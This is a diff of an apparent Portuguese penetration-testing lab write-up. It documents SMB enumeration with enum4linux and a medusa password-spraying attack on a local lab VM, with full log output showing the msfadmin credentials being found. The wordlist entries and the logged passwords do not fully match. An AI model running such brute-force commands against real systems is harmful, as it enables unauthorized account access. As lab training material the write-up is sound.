@@ -261,4 +261,44 @@ Após testes de brute force, o acesso ao formulario foi autenticado com sucesso.
 
 O endereço 192.168.56.101/dvwa/index.php foi exibido.
 
+ATAQUE SMB E ENUMERAÇÃO DE USUÁRIOS
+
+Realizado o comando enum4linux -a 192.168.56.101 | tee enum_output.txt para gerar relatório do ambiente a ser invadido.
+
+CRIAÇÃO DE WORDLISTS PARA ATAQUE SMB 
+
+$ echo -e "user\nmfsadmin\nservice" > smb_users.txt
+
+$ echo -e "password\np(123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+
+EXECUTANDO ATAQUE 
+
+
+$ medusa -H 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+Medusa V2.3 (http://www.foofus.net) (c) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2025-11-30 22:49:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: password (1 of 4 complete)
+
+2025-11-30 22:49:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: msfadmin (2 of 4 complete)
+
+2025-11-30 22:49:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: 123456 (3 of 4 complete)
+
+2025-11-30 22:49:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: Welcome123 (4 of 4 complete)
+
+2025-11-30 22:49:19 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: 123456 (1 of 4 complete)
+
+2025-11-30 22:49:19 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: password (2 of 4 complete)
+
+2025-11-30 22:49:19 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: Welcome123 (3 of 4 complete)
+
+2025-11-30 22:49:19 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: msfadmin (4 of 4 complete)
+
+2025-11-30 22:49:19 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 3 complete) Password: 123456 (1 of 4 complete)
+
+2025-11-30 22:49:19 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 3 complete) Password: msfadmin (4 of 4 complete)
+
+2025-11-30 22:49:19 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMINS - Access Allowed)]
+
 
